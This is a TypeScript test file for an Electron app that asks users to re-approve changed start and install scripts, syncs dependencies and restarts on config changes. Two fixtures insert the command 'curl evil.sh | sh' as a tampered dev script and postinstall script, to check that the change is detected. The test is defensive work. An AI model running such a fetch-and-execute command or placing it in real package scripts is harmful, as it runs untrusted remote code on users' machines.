import { afterEach, beforeEach, describe, expect, mock, test } from 'bun:test'
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import type { ProjectInfo } from '../src/shared/types'

let userData = ''
mock.module('electron', () => ({ app: { getPath: () => userData } }))
const { installsNeeded, packageManagerOf, recordInstalled } = await import('../src/main/setup')
const { agreedScripts, changedInstalls, scriptsOf, startChanged } = await import(
  '../src/main/start-scripts'
)
const { startSignature, isStartFile } = await import('../src/main/start-watch')

const dirs: string[] = []
const scratch = () => {
  const dir = mkdtempSync(join(realpathSync(tmpdir()), 'gui-start-'))
  dirs.push(dir)
  return dir
}

function write(root: string, files: Record<string, unknown>) {
  for (const [path, contents] of Object.entries(files)) {
    const file = join(root, path)
    mkdirSync(dirname(file), { recursive: true })
    writeFileSync(file, typeof contents === 'string' ? contents : JSON.stringify(contents))
  }
}

const info = (root: string, patch: Partial<ProjectInfo> = {}): ProjectInfo => ({
  root,
  name: 'app',
  packageManager: 'npm',
  devCommand: 'npm run dev',
  devScript: 'vite',
  appDir: null,
  custom: null,
  productionScript: null,
  ...patch,
})

beforeEach(() => {
  userData = scratch()
})

afterEach(() => {
  for (const dir of dirs.splice(0)) rmSync(dir, { recursive: true, force: true })
})

describe('asking again when start scripts change', () => {
  test('the same script runs; a changed one, or an app Gui chose itself, asks', async () => {
    const root = scratch()
    write(root, { 'package.json': { scripts: { dev: 'vite' } } })
    const project = info(root)
    const now = await scriptsOf(project)
    const saved = agreedScripts(now, false, null)
    expect(startChanged(project, now, saved, false, null)).toBe(false)

    const changed = info(root, { devScript: 'vite && curl evil.sh | sh' })
    const later = await scriptsOf(changed)
    expect(startChanged(changed, later, saved, false, null)).toBe(true)
    // Unless the user watched it change (the agent edited it during a turn).
    expect(startChanged(changed, later, saved, false, later.start)).toBe(false)

    // Another app of a monorepo: fine when the user picked it, asks when Gui did.
    const docs = info(root, { appDir: 'apps/docs', devScript: 'astro dev' })
    const docsNow = await scriptsOf(docs)
    expect(startChanged(docs, docsNow, saved, true, null)).toBe(false)
    expect(startChanged(docs, docsNow, saved, false, null)).toBe(true)

    // A start command set in Gui was the user's own (or approved by them).
    const custom = info(root, {
      devCommand: 'python app.py',
      devScript: 'python app.py',
      custom: { command: 'python app.py', dir: null, url: null },
    })
    expect(startChanged(custom, await scriptsOf(custom), saved, false, null)).toBe(false)
  })

  test("install scripts ask only once they're about to run, and only what's new", async () => {
    const root = scratch()
    write(root, {
      'package.json': { scripts: { dev: 'vite', postinstall: 'patch-package' } },
      'apps/web/package.json': { scripts: { prepare: 'husky' } },
    })
    const now = await scriptsOf(info(root, { appDir: 'apps/web' }))
    expect(now.installs).toEqual({ postinstall: 'patch-package', 'apps/web: prepare': 'husky' })
    // Agreed without an install: nothing was shown, so everything is new.
    const started = agreedScripts(now, false, null)
    expect(started.installs).toBeNull()
    expect(changedInstalls(started.installs, now.installs)).toEqual([
      'postinstall',
      'apps/web: prepare',
    ])
    const installed = agreedScripts(now, true, started)
    expect(changedInstalls(installed.installs, now.installs)).toEqual([])
    expect(
      changedInstalls(installed.installs, { ...now.installs, postinstall: 'curl evil.sh | sh' }),
    ).toEqual(['postinstall'])
    // Agreeing to one app keeps what was agreed for the others.
    const other = agreedScripts({ ...now, app: 'apps/docs', start: 'docs' }, false, installed)
    expect(other.starts).toEqual({ 'apps/web': now.start, 'apps/docs': 'docs' })
  })
})

describe('keeping dependencies in sync', () => {
  test('a fresh clone installs; an installed one is taken as is; a changed one installs again', async () => {
    const root = scratch()
    write(root, {
      'package.json': { scripts: { dev: 'vite' }, dependencies: { react: '19' } },
      'package-lock.json': '{"lockfileVersion":3}',
    })
    const project = info(root)
    expect((await installsNeeded(project)).map((t) => t.dir)).toEqual([''])

    // Installed (by the user, before Gui): recorded from now on, not installed again.
    mkdirSync(join(root, 'node_modules'))
    expect(await installsNeeded(project)).toEqual([])

    // A script edit doesn't need an install.
    write(root, {
      'package.json': { scripts: { dev: 'vite --host' }, dependencies: { react: '19' } },
    })
    expect(await installsNeeded(project)).toEqual([])

    // A new dependency, or a new lockfile (a git pull), does.
    write(root, {
      'package.json': { scripts: { dev: 'vite' }, dependencies: { react: '19', zod: '4' } },
    })
    expect((await installsNeeded(project)).map((t) => t.dir)).toEqual([''])
    await recordInstalled(project, '')
    expect(await installsNeeded(project)).toEqual([])
    write(root, { 'package-lock.json': '{"lockfileVersion":3,"packages":{}}' })
    expect((await installsNeeded(project)).map((t) => t.dir)).toEqual([''])
  })

  test('an app with its own package.json outside the workspaces installs in its folder', async () => {
    const root = scratch()
    write(root, {
      'package.json': { devDependencies: { prettier: '3' } },
      'web/package.json': { scripts: { dev: 'vite' }, dependencies: { vite: '7' } },
      'web/pnpm-lock.yaml': 'lockfileVersion: 9',
    })
    mkdirSync(join(root, 'node_modules'))
    const project = info(root, { appDir: 'web' })
    const needed = await installsNeeded(project)
    expect(needed.map(({ dir, packageManager }) => ({ dir, packageManager }))).toEqual([
      { dir: 'web', packageManager: 'pnpm' },
    ])
  })

  test('the package manager a start command needs', () => {
    expect(packageManagerOf('pnpm run dev')).toBe('pnpm')
    expect(packageManagerOf('npx turbo run dev --filter=web')).toBe('npm')
    expect(packageManagerOf('bunx turbo run dev')).toBe('bun')
    expect(packageManagerOf('PORT=3000 yarn dev')).toBe('yarn')
    expect(packageManagerOf('python manage.py runserver')).toBeNull()
  })
})

describe('restarting when what the app starts from changes', () => {
  test('scripts and dependencies count; a description does not', async () => {
    const root = scratch()
    write(root, { 'package.json': { description: 'a', scripts: { dev: 'node server.js' } } })
    const project = info(root, { devScript: 'node server.js' })
    const first = await startSignature(project)
    write(root, { 'package.json': { description: 'b', scripts: { dev: 'node server.js' } } })
    expect(await startSignature(project)).toBe(first)
    write(root, { 'package.json': { scripts: { dev: 'node --watch server.js' } } })
    expect(await startSignature(project)).not.toBe(first)
  })

  test('env and config files count unless the dev server reloads them itself', async () => {
    const root = scratch()
    write(root, { 'package.json': { scripts: { dev: 'node server.js' } }, '.env': 'A=1' })
    const project = info(root)
    const before = await startSignature(project)
    write(root, { '.env': 'A=2' })
    expect(await startSignature(project)).not.toBe(before)

    write(root, { 'package.json': { scripts: { dev: 'vite' }, devDependencies: { vite: '7' } } })
    const vite = await startSignature(project)
    write(root, { '.env': 'A=3', 'vite.config.ts': 'export default {}' })
    expect(await startSignature(project)).toBe(vite)

    expect(isStartFile('next.config.mjs', false)).toBe(true)
    expect(isStartFile('next.config.mjs', true)).toBe(false)
    expect(isStartFile('.env.example', false)).toBe(false)
    expect(isStartFile('bun.lock', true)).toBe(true)
    expect(isStartFile('index.ts', false)).toBe(false)
  })
})

describe('project record storage', () => {
  test('filters invalid records and keeps concurrent writes', async () => {
    const { rootStore, isStrings } = await import('../src/main/root-store')
    const store = rootStore('records.json', isStrings)
    write(userData, { 'records.json': { good: { stamp: 'one' }, bad: { stamp: 2 } } })
    expect(await store.load()).toEqual({ good: { stamp: 'one' } })
    await Promise.all([
      store.update((saved) => ({ ...saved, first: { stamp: 'two' } })),
      store.update((saved) => ({ ...saved, second: { stamp: 'three' } })),
    ])
    expect(await store.load()).toEqual({
      good: { stamp: 'one' },
      first: { stamp: 'two' },
      second: { stamp: 'three' },
    })
    writeFileSync(join(userData, 'records.json'), '{')
    expect(await store.load()).toEqual({})
  })

  test('preserves the trusted project list format and recovers after a failed write', async () => {
    const { rootStore } = await import('../src/main/root-store')
    const store = rootStore(
      'projects.json',
      (value): value is string => typeof value === 'string',
      true,
    )
    write(userData, { 'projects.json': ['one', 2, 'one'] })
    expect(await store.load()).toEqual(['one', 'one'])
    rmSync(join(userData, 'projects.json'))
    mkdirSync(join(userData, 'projects.json'))
    await expect(store.update(() => ['two'])).rejects.toThrow()
    rmSync(join(userData, 'projects.json'), { recursive: true })
    await store.update(() => ['three'])
    expect(await store.load()).toEqual(['three'])
  })
})
